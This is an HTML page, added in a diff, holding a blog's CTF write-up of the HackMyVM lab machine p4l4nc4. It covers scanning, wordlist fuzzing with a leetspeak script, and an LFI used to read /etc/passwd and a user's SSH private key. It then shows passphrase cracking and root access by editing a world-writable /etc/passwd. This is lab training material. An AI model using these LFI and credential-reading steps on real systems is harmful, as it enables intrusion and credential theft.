@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div style="margin-top: 50px; margin-right: 16px;" class="title-container">
+                    <img src="../images/icons/hvm_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">p4l4nc4</h2>
+                </div>
+                
+                <img src="../images/Posts/p4l4nc4/palanca.png" alt="" class="right-machineimage">
+
+                <ul style="margin-bottom: 350px;" class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Introduction" class="sidebar-link">1. Introduction</a></li>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">2. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration" class="sidebar-link">2.1 Enumeration</a></li>
+                        <li><a href="#Foothold" class="sidebar-link">2.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation" class="sidebar-link">2.3 Privilege Escalation</a></li>
+                    </ul>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>p4l4nc4 WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/p4l4nc4/palanca_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h1>Table of Contents</h1>
+                        <ul>
+                            <li><a href="#Introduction">1. Introduction</a></li>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough">2. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration">2.1 Enumeration</a></li>
+                                <li><a href="#Foothold">2.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation">2.3 Privilege Escalation</a></li>
+                            </ul>
+                        </ul>
+                    </div>
+
+                    <section id="Introduction">
+                        <h1>1. Introduction</h1>
+                        <p>p4l4nc4 is an easy <strong>HackMyVm</strong> Linux machine, designed by <a href="https://hackmyvm.eu/profile/?user=elpensador" target="_blank">elpensador</a>. This machine is ideal for those who are just starting out on this platform. In this writeup, we will explore how to write a Bash script that will help us perform a detailed file enumeration on a specific service. Additionally, we will examine excessive configurations and permissions within the system, allowing us to identify potential vectors for privilege escalation.</p>
+                    </section>
+                                        
+                    <section id="Internal-Network-Compromise-Walkthrough">
+                        <h1>2. Internal Network Compromise Walkthrough</h1>
+                        <p>This section will detail a full walkthrough of the machine exploitation process, broken down step-by-step. We will begin with the enumeration phase, which will scan for open ports, available services, and potential vulnerabilities in the system, including reviewing the web application if applicable. Next, we will delve deeper into active services and their configurations, and then move on to exploiting any identified vulnerabilities. Finally, we will cover privilege escalation, describing the techniques and tools used to gain access to the system as the highest-level user, thereby achieving full control of the machine.</p>
+                    </section>
+                    
+                    <section id="Enumeration">
+                        <h1>2.1 Enumeration</h1>
+                        <h3>Host Discover</h3>
+                        <p>We start with host discovery and for this we will use the command: `<strong>arp-scan -I eth0 --localnet</strong>`</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo arp-scan -I eth0 --localnet
+Interface: eth0, type: EN10MB, MAC: 08:00:27:6e:13:6e, IPv4: 10.10.10.144
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+10.10.10.1      52:54:00:12:35:00       QEMU
+10.10.10.2      52:54:00:12:35:00       QEMU
+10.10.10.3      08:00:27:e4:a4:91       PCS Systemtechnik GmbH
+10.10.10.147    08:00:27:88:68:47       PCS Systemtechnik GmbH
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.938 seconds (132.09 hosts/sec). 4 responded
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/1.png" alt="">
+                        </div>
+                        <p>We discovered the target IP: <strong>10.10.10.147</strong></p>
+                        <h3>Nmap</h3>
+                        <p>We proceed to list open ports with the nmap tool.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -n -v -Pn -p- 10.10.10.147          
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 07:59 EST
+Initiating ARP Ping Scan at 07:59
+Scanning 10.10.10.147 [1 port]
+Completed ARP Ping Scan at 07:59, 0.03s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 07:59
+Scanning 10.10.10.147 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.147
+Discovered open port 22/tcp on 10.10.10.147
+Completed SYN Stealth Scan at 07:59, 1.08s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.147
+Host is up (0.000055s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:88:68:47 (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+
+                            </pre>
+                        </div>
+                        <p>From the previous scan we have:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22/tcp</td>
+                                    <td>SSH</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80/tcp</td>
+                                    <td>http</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p>We run <strong>NSE</strong> scripts to detect potential vulnerabilities and misconfigurations and collect information about service versions using the `<strong>-sCV</strong>` parameter.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -n -v -Pn -sCV -p 22,80 10.10.10.147 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 08:00 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Initiating ARP Ping Scan at 08:00
+Scanning 10.10.10.147 [1 port]
+Completed ARP Ping Scan at 08:00, 0.04s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 08:00
+Scanning 10.10.10.147 [2 ports]
+Discovered open port 80/tcp on 10.10.10.147
+Discovered open port 22/tcp on 10.10.10.147
+Completed SYN Stealth Scan at 08:00, 0.01s elapsed (2 total ports)
+Initiating Service scan at 08:00
+Scanning 2 services on 10.10.10.147
+Completed Service scan at 08:00, 6.04s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.147.
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.25s elapsed
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.01s elapsed
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Nmap scan report for 10.10.10.147
+Host is up (0.00018s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
+|_  256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+MAC Address: 08:00:27:88:68:47 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Initiating NSE at 08:00
+Completed NSE at 08:00, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
+           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
+                            </pre>
+                        </div>
+                        <p>From the previous scan we have:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Version</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22</td>
+                                    <td>SSH</td>
+                                    <td>OpenSSH 9.2p1 Debian</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80</td>
+                                    <td>http</td>
+                                    <td>Apache httpd 2.4.62</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>HTTP</h3>
+                        <p>Navigating to port 80 we find the typical Apache welcome page that tells us that everything has been installed correctly.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/2.png" alt="">
+                        </div>
+                        <p>Since we can't do anything else at this point, we proceed to perform web fuzzing.</p>
+                        <h3>Fuzzing</h3>
+                        <p>We will use the gobuster tool to list directories and files with extensions php,html or txt.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/3.png" alt="">
+                        </div>
+                        <p>We found a curious file called robots.txt.</p>
+                        <p>The content of this file seems to be in Portuguese and tells us about an animal called the <i>palanca negra gigante</i>.</p>
+                        <div class="console-code">
+                            <pre>
+$ curl -s http://10.10.10.147/robots.txt
+
+A palanca-negra-gigante Ã© uma subespÃ©cie de palanca-negra. De todas as subespÃ©cies, esta 
+destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃ©cie 
+Ã© endÃ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a 
+Reserva Natural Integral de Luando. Em 2002, apÃ³s a Guerra Civil Angolana, pouco se conhecia 
+sobre a sobrevivÃªncia de mÃºltiplas espÃ©cies em Angola e, de facto, receava-se que a Palanca 
+Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e 
+InvestigaÃ§Ã£o CientÃ­fica da Universidade CatÃ³lica de Angola, liderado pelo Dr. Pedro vaz 
+Pinto, obteve as primeiras evidÃªncias fotogrÃ¡ficas do Ãºnico rebanho que restava no Parque 
+Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃªncia da populaÃ§Ã£o 
+apÃ³s um duro perÃ­odo de guerra.
+Atualmente, a Palanca Negra Gigante Ã© considerada como o sÃ­mbolo nacional de Angola, sendo 
+motivo de orgulho para o povo angolano. Como prova disso, a seleÃ§Ã£o de futebol angolana Ã© 
+denominada de palancas-negras e a companhia aÃ©rea angolana, TAAG, tem este antÃ­lope como 
+sÃ­mbolo. Palanca Ã© tambÃ©m o nome de uma das subdivisÃµes da cidade de Luanda, capital de 
+Angola. Na mitologia africana, assim como outros antÃ­lopes, eles simbolizam vivacidade, 
+velocidade, beleza e nitidez visual
+                            </pre>
+                        </div>
+                        <p>With this information discovered we can create a dictionary to fuzz directories again or even try brute forcing port 22. To do this we will use the <strong>cewl</strong> tool with the command: <strong>cewl http://10.10.10.147/robots.txt -w dic.txt</strong></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/4.png" alt="">
+                        </div>
+                        <p>We check the created file:</p>
+                        <div class="console-code">
+                            <pre>
+$ cat dic.txt 
+
+Angola
+subespÃ
+Palanca
+como
+palanca
+negra
+uma
+cie
+cies
+.
+.
+.
+&lt;SNAP>
+.
+.
+.
+lopes
+eles
+simbolizam
+vivacidade
+velocidade
+beleza
+nitidez
+visual
+                            </pre>
+                        </div>
+                        <p>Looking at the target machine, I noticed that the username `<strong>4ng014</strong>` is written in <strong>1337</strong> format. So with this clue we can convert the dictionary words to this format to have a better chance of finding something of interest.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/5.png" alt="">
+                        </div>
+                        <p>We write a small bash script that does this task:</p>
+                        <div class="console-code">
+                            <pre>
+$ cat script.sh
+
+#!/bin/bash
+
+# Verify that a file was provided as an argument.
+if [ "$#" -ne 1 ]; then
+    echo "Use: $0 dic.txt"
+    exit 1
+fi
+
+# Input/output files
+file_input="$1"
+file_output="dic_1337.txt"
+
+# Transformations in basic 1337 format using sed tool
+sed -e 's/a/4/g' \
+    -e 's/e/3/g' \
+    -e 's/i/1/g' \
+    -e 's/l/1/g' \
+    -e 's/o/0/g' \
+    -e 's/s/5/g' \
+    -e 's/t/7/g' \
+
+    "$file_input" > temp_1337.txt
+    
+#Merge original and transformed words, removing duplicates and unnecessary capital letters:
+
+cat "$file_input" temp_1337.txt | tr '[:upper:]' '[:lower:]'| sort | uniq > "$file_output"
+
+#Clean temp file
+rm temp_1337.txt
+
+#Show success
+
+echo "The dictionary in 1337 format was saved in: $file_output"
+                            </pre>
+                        </div>
+                        <p>We give execution permissions and run the script providing the created dictionary as input.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/6.png" alt="">
+                        </div>
+                        <p>We check our dictionary created:</p>
+                        <div class="console-code">
+                            <pre>
+$ cat dic_1337.txt 
+
+0b73v3
+0d0
+0rgu1h0
+0u7r05
+10c415
+10p3
+10p35
+11c4
+11d3r4d0
+3135
+.
+.
+.
+&lt;SNAP>
+.
+.
+.
+un1v3r51d4d3
+ungu14d05
+ungulados
+universidade
+v15u41
+v1v4c1d4d3
+v310c1d4d3
+v4z
+vaz
+velocidade
+visual
+vivacidade
+                            </pre>
+                        </div>
+                        <p>With this we will try to fuzz again and we find a result:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/7.png" alt="">
+                        </div>
+                        <p>We fuzz again and find an interesting php file.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/8.png" alt="">
+                        </div>
+                        <p>Browsing the site we don't find anything interesting, but maybe we need to add a parameter to read some file.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/9.png" alt="">
+                        </div>
+                        <p>This time we will use <strong>wfuzz</strong> to find out if there are any parameters that match, so we can read files from the system. We will use the command:</p>
+                        <p><i style="font-size: 15px;">`wfuzz -w /usr/share/wordlists/dirb/common.txt -u "http://10.10.10.147/n3gr4/m414nj3.php?FUZZ=/etc/passwd" --hh=0`</i></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/10.png" alt="">
+                        </div>
+                    </section>
+
+                    <section id="Foothold">
+                        <h2>2.2 Foothold</h2>
+                        <p>We found a valid parameter, confirmed the website is vulnerable to <strong>LFI</strong>, and found the user `<strong>p4l4nc4</strong>`.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/11.png" alt="">
+                        </div>
+                        <p>Since we can read system files, we can try to read the <strong>id_rsa</strong> key of this user with the command: `http://10.10.10.147/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/12.png" alt="">
+                        </div>
+                        <p style="text-align: left;">We can download the file directly to our working directory with the command:</p>
+                        <p>`curl "http://10.10.10.147/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa" -o id_rsa`</p>
+                        <p>Given the format of the <strong>id_rsa</strong> key, we can deduce that it is encrypted. We will use the <strong>JohnTheRipper</strong> tool to decrypt it.</p>
+                        <p>We use the commands:</p>
+                        <div class="console-code">
+                            <pre>
+$ ssh2john id_rsa > hash
+
+$ john hash -w=/usr/share/wordlists/rockyou.txt
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/13.png" alt="">
+                        </div>
+                        <p>We have the password and now we give the necessary permissions to the <strong>id_rsa</strong> with the command: `<strong>chmod 600 id_rsa</strong>` and we connect via ssh as the user <strong>p4l4nc4</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/14.png" alt="">
+                        </div>
+                        <p>By enumerating the user's home directory, we find that we can read the user's <i>.bash_history</i>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/15.png" alt="">
+                        </div>
+                        <p>Reading the file, we find that it appears that the system administrator has been configuring important files and permissions. And what immediately catches our attention is that overly permissive and unnecessary permissions have been granted to the <i>/etc/passwd</i> file. These permissions mean that any user on the system can edit this file.</p>
+                        <div class="console-code">
+                            <pre>
+p4l4nc4@4ng014:~$ cat .bash_history
+
+cdls
+ls -al
+cd bash 
+sudo bash 
+ls
+cd /home/p4l4nc4/
+.
+.
+.
+&lt;SNAP>
+.
+.
+.
+cd n3gr4/
+nano m414nj3.php 
+sudo nano m414nj3.php 
+ls
+ls -l
+ls /etc/passwd
+ls -l /etc/passwd
+sudo chmod rw-rw-rw- /etc/passwd
+sudo chmod rwrwrw /etc/passwd
+sudo chmod 666 /etc/passwd
+ls -l /etc/passwd
+nano m414nj3.php 
+sudo nano m414nj3.php 
+.
+.
+.
+&lt;SNAP>
+.
+.
+.
+ls
+sudo nano user.txt 
+cd root
+cd /root
+sudo bash
+visudo
+sudo visudo
+exit
+
+                            </pre>
+                        </div>
+                        <p>Which we confirm with the command: `<strong>ls -al /etc/passwd</strong>`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/16.png" alt="">
+                        </div>
+                    </section>
+                    
+                    <section id="Privilege-Escalation">
+                        <h2>2.3 Privilege Escalation</h2>
+                        <p>To take advantage of this misconfiguration we will edit the <i>/etc/passwd</i> file, more specificallywe will remove the letter `<strong>x</strong>` from the line that belongs to the root user.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/17.png" alt="">
+                        </div>
+                        <p>The final file should look like this:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/18.png" alt="">
+                        </div>
+                        <p>We run the command `<strong>su - root</strong>` to switch to the root user without providing the root password.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/p4l4nc4/19.png" alt="">
+                        </div>
+                        <p>This happens because removing the `<strong>x</strong>` character from the root user's password entry would make it an empty field in the <i>/etc/passwd</i> file, which causes the system to allow any non-privileged user to log in as root without having to provide a password.</p>
+                    </section>
+
+                    <!--Final-->
+                </section>
+            </div>
+        </div>
+    </div>
+    
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <!--Pet Cat-->
+    <script src="script.js"></script>
+</body>
+</html>
